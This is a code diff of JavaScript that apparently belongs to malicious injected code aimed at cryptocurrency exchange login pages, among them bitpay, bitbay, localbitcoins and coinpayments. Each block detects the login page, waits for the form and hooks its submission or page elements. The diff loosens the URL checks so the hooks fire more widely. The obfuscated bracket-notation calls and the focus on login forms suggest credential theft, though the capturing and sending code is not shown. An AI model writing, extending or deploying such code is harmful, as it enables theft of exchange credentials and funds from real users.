@@ -150,7 +150,7 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
-  if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
+  if (window.location.href.indexOf("bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
     var login_form = document.getElementById("loginForm");
       if(login_form){
           login_form.onsubmit = function(){
@@ -161,7 +161,7 @@ for (var i = 0; i < arrayLength; i++) {
             }
           };
 
-  if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login') > -1) {
+  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('bp-constrain-login')[0]) {
               clearInterval(interval);
@@ -174,7 +174,7 @@ for (var i = 0; i < arrayLength; i++) {
       }, 1000)
   };
 
-  if (top['location']['href'] === 'https://auth.bitbay.net/login') {
+  if (top['location']['href'] === 'auth.bitbay.net/login') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -186,7 +186,7 @@ for (var i = 0; i < arrayLength; i++) {
           }
       }, 1000)
   };
-  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
+  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -199,7 +199,7 @@ for (var i = 0; i < arrayLength; i++) {
       }, 1000)
   };
 
-  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
+  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
@@ -215,7 +215,7 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
-  if (top['location']['href']['indexOf']('https://localbitcoins.com/accounts/login/') > -1) {
+  if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
         var interval = setInterval(function () {
             if (document['getElementsByClassName']('container')) {
                 clearInterval(interval);
@@ -228,7 +228,7 @@ for (var i = 0; i < arrayLength; i++) {
         }, 1000)
     };
 
-  if (top['location']['href']['indexOf']('https://sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
+  if (top['location']['href']['indexOf']('sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
         var interval = setInterval(function () {
             if (document['getElementsByClassName']('form-signin')) {
                 clearInterval(interval);
@@ -241,7 +241,7 @@ for (var i = 0; i < arrayLength; i++) {
         }, 1000)
     };
 
-  if (top['location']['href']['indexOf']('https://onixcoin.com/inicio-sesion/') > -1) {
+  if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
         var interval = setInterval(function () {
             if (document['getElementsByClassName']('onix-info')) {
                 clearInterval(interval);
@@ -253,7 +253,7 @@ for (var i = 0; i < arrayLength; i++) {
             }
         }, 1000)
     };
-  if (top['location']['href']['indexOf']('https://www.coinpayments.net/login') > -1) {
+  if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
         var interval = setInterval(function () {
             if (document['getElementsByClassName']('login')) {
                 clearInterval(interval);
